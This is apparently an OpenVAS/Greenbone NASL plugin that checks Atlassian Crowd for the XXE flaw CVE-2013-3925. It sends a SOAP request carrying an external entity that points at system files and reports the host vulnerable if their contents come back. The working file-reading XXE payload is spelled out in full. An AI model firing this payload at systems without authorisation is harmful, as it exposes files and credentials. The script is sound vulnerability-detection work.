CPE = "cpe:/a:atlassian:crowd";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803830" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2013-3925" );
	script_bugtraq_id( 60899 );
	script_tag( name: "cvss_base", value: "5.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-07-09 15:27:15 +0530 (Tue, 09 Jul 2013)" );
	script_name( "Atlassian Crowd Xml eXternal Entity (XXE) Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_atlassian_crowd_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "atlassian_crowd/installed" );
	script_xref( name: "URL", value: "https://jira.atlassian.com/browse/CWD-3366" );
	script_xref( name: "URL", value: "http://www.commandfive.com/papers/C5_TA_2013_3925_AtlassianCrowd.pdf" );
	script_tag( name: "summary", value: "This host is running Atlassian Crowd and is prone to an XML external
  entity injection vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP POST request and check whether it is possible to
  read a file from the remote system." );
	script_tag( name: "solution", value: "Upgrade to version 2.5.4, 2.6.3, 2.7 or later." );
	script_tag( name: "insight", value: "Flaw is due to an incorrectly configured XML parser accepting XML external
  entities from an untrusted source." );
	script_tag( name: "affected", value: "Atlassian Crowd 2.5.x before 2.5.4, 2.6.x before 2.6.3, 2.3.8, and 2.4.9." );
	script_tag( name: "impact", value: "Successful exploitation allows remote attackers to gain access to arbitrary
  files by sending specially crafted XML data." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/crowd/services/2/";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(res && ContainsString( res, "Invalid SOAP request" )){
	files = traversal_files();
	useragent = http_get_user_agent();
	host = http_host_name( port: port );
	entity = rand_str( length: 8, charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" );
	for pattern in keys( files ) {
		file = files[pattern];
		soap = "<!DOCTYPE x [ <!ENTITY " + entity + " SYSTEM \"file:///" + file + "\"> ]>" + "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">" + "<s:Body>" + "<authenticateApplication xmlns=\"urn:SecurityServer\">" + "<in0 " + "xmlns:a=\"http://authentication.integration.crowd.atlassian.com\" " + "xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\">" + "<a:credential>" + "<a:credential>password</a:credential>" + "<a:encryptedCredential>&" + entity + ";</a:encryptedCredential>" + "</a:credential>" + "<a:name>username</a:name>" + "<a:validationFactors i:nil=\"true\"/>" + "</in0>" + "</authenticateApplication>" + "</s:Body>" + "</s:Envelope>";
		len = strlen( soap );
		req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "SOAPAction: ", "\"\"", "\\r\\n", "Content-Type: text/xml; charset=UTF-8\\r\\n", "Content-Length: ", len, "\\r\\n", "\\r\\n", soap );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(egrep( pattern: pattern, string: res )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

